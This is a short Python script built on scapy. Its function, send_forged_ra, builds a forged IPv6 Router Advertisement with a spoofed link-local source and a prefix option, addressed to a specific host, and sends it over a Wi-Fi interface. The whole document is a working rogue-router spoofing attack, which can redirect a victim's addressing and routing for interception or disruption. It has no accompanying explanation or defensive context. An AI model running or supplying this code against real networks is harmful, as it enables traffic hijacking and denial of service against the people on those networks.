from scapy.all import *
def send_forged_ra():
	ipv6 = IPv6(dst='2001:e10:6840:106:8e65:d743:218f:77e0', src='fe80::7790:4ac2:4302:ec34%12')
	ra = ICMPv6ND_RA()
	prefix = ICMPv6NDOptPrefixInfo(prefix='2001:e10:6840:106::', prefixlen=64, validlifetime=864000, preferredlifetime=86400)
	packet = ipv6 / ra / prefix
	send(packet, iface='Wi-Fi')
send_forged_ra()